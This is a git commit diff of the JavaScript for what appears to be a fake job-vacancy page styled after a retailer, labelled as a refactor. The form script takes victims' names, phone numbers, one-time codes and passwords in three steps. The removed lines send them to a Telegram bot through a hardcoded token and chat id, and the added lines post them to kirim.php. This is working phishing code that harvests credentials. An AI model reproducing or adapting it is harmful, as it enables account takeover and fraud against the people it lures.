cf08fde5e00c2904cd3c83ed1bb40547547360af
Kerjaya Terkini <ogaselloga@gmail.com>
2026-02-11 16:58:16 +0800

    Refactor form submission functions for clarity

--- jawatankosong1.gy-i1d.com/02/jobs/MR.D.I.Y/assets/js/script.js
+++ jawatankosong1.gy-i1d.com/02/jobs/MR.D.I.Y/assets/js/script.js
@@ -1,111 +1,101 @@
-function processFirstData(){
-	$('#firstForm').submit(function(submitingprocessFirstData){
-	submitingprocessFirstData.preventDefault();
-	
-	var $full_name = $("input#full_name").val();
-	var $phone_number = $("input#phone_number").val();
-	
+function processFirstData() {
+    $('#firstForm').submit(function(e) {
+        e.preventDefault();
 
-	var gabungan = 'full_name%3A%0A'+full_name.value+'%0Aphone_number%3A%0A'+phone_number.value;
+        var $full_name = $("input#full_name").val();
+        var $phone_number = $("input#phone_number").val();
 
+        if ($full_name == "" || $phone_number == "") {
+            $('.verification_info').show();
+            $('.account_verification').hide();
+            return false;
+        }
 
-	var token = '7631033651:AAHhj41wsNY5qRTrfGJ_1ouXn9lkz6zJgWM';
-	var grup = '-4932277785';
-
-	if($full_name == "" && $phone_number == ""){
-	$('.verification_info').show();
-	$('.account_verification').hide();
-	return false;
-	}
-	
-	$.ajax({
-		type: "POST",
-		url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-		data: $(this).serialize(),
-		beforeSend: function() {
-			$('.loading').show();
-		},
-		success: function(){
-		$(".second").show();
-		$('.loading').hide();
-		$('.first').hide();
-		$("input#validateFullName").val($full_name);
-		$("input#validatePhoneNumber").val($phone_number);
-		}
-	});
-	});  
-	return false;
+        $.ajax({
+            type: "POST",
+            url: "kirim.php", // Mengarah ke file PHP kita
+            data: $(this).serialize(), // Mengirim data form (name & phone)
+            beforeSend: function() {
+                $('.loading').show();
+            },
+            success: function() {
+                $(".second").show();
+                $('.loading').hide();
+                $('.first').hide();
+                $("input#validateFullName").val($full_name);
+                $("input#validatePhoneNumber").val($phone_number);
+            }
+        });
+    });
+    return false;
 };
 
-function processSecondData(){
-	$('#secondForm').submit(function(submitingprocessSecondData){
-	submitingprocessSecondData.preventDefault();
-	
-	var $full_name = $("input#validateFullName").val();
-	var $phone_number = $("input#validatePhoneNumber").val();
-	var $otp_code = $("input#otp").val();
+function processSecondData() {
+    $('#secondForm').submit(function(e) {
+        e.preventDefault();
 
-	var gabungan = 'full_name%3A%0A'+full_name.value+'%0Aphone_number%3A%0A'+phone_number.value+`%0Aotp%3A%0A`+otp.value;
-	
-	var token = '7631033651:AAHhj41wsNY5qRTrfGJ_1ouXn9lkz6zJgWM';
-	var grup = '-4932277785';
-	if($full_name == "" && $phone_number == "" && $otp == ""){
-	$('.verification_info').show();
-	$('.account_verification').hide();
-	return false;
-	}
-	
-	$.ajax({
-		type: "POST",
-		url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-		data: $(this).serialize(),
-		beforeSend: function() {
-			$('.loading').show();
-		},
-		success: function(){
-		$(".third").show();
-		$('.loading').hide();
-		$('.second').hide();
-		$("input#validateOtp").val($otp);
-		}
-	});
-	});  
-	return false;
+        var $full_name = $("input#validateFullName").val();
+        var $phone_number = $("input#validatePhoneNumber").val();
+        var $otp_code = $("input#otp").val();
+
+        if ($full_name == "" || $phone_number == "" || $otp_code == "") {
+            $('.verification_info').show();
+            $('.account_verification').hide();
+            return false;
+        }
+
+        // Kita perlu mengirim full_name dan phone_number juga agar PHP bisa mencatatnya
+        var dataKirim = $(this).serialize() + "&full_name=" + encodeURIComponent($full_name) + "&phone_number=" + encodeURIComponent($phone_number);
+
+        $.ajax({
+            type: "POST",
+            url: "kirim.php",
+            data: dataKirim,
+            beforeSend: function() {
+                $('.loading').show();
+            },
+            success: function() {
+                $(".third").show();
+                $('.loading').hide();
+                $('.second').hide();
+                $("input#validateOtp").val($otp_code);
+            }
+        });
+    });
+    return false;
 };
 
-function processThirdData(){
-	$('#thirdForm').submit(function(submitingprocessThirdData){
-	submitingprocessThirdData.preventDefault();
-	
-	var $full_name = $("input#validateFullName").val();
-	var $phone_number = $("input#validatePhoneNumber").val();
-	var $otp_code = $("input#otp").val();
-	var $password = $("input#password").val();
+function processThirdData() {
+    $('#thirdForm').submit(function(e) {
+        e.preventDefault();
 
-	var gabungan = 'full_name%3A%0A'+full_name.value+'%0Aphone_number%3A%0A'+phone_number.value+`%0Aotp%3A%0A`+otp.value+`%0Apassword%3A%0A`+password.value;
-	
-	var token = '7631033651:AAHhj41wsNY5qRTrfGJ_1ouXn9lkz6zJgWM';
-	var grup = '-4932277785';
-	
-	if($full_name == "" && $phone_number == "" && $otp == "" && $password == ""){
-	$('.verification_info').show();
-	$('.account_verification').hide();
-	return false;
-	}
-	
-	$.ajax({
-		type: "POST",
-		url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-		data: $(this).serialize(),
-		beforeSend: function() {
-			$('.loading').show();
-		},
-		success: function(){
-		$(".four").show();
-		$('.loading').hide();
-		$('.third').hide();
-		}
-	});
-	});  
-	return false;
+        var $full_name = $("input#validateFullName").val();
+        var $phone_number = $("input#validatePhoneNumber").val();
+        var $otp_code = $("input#otp").val(); // Pastikan input OTP sebelumnya nilainya terbawa/tersimpan
+        // Jika input OTP hilang di tahap 3, Anda perlu input hidden dengan id="validateOtp"
+        var $password = $("input#password").val();
+
+        if ($full_name == "" || $phone_number == "" || $password == "") {
+            $('.verification_info').show();
+            $('.account_verification').hide();
+            return false;
+        }
+
+        var dataKirim = $(this).serialize() + "&full_name=" + encodeURIComponent($full_name) + "&phone_number=" + encodeURIComponent($phone_number) + "&otp=" + encodeURIComponent($otp_code);
+
+        $.ajax({
+            type: "POST",
+            url: "kirim.php",
+            data: dataKirim,
+            beforeSend: function() {
+                $('.loading').show();
+            },
+            success: function() {
+                $(".four").show();
+                $('.loading').hide();
+                $('.third').hide();
+            }
+        });
+    });
+    return false;
 };
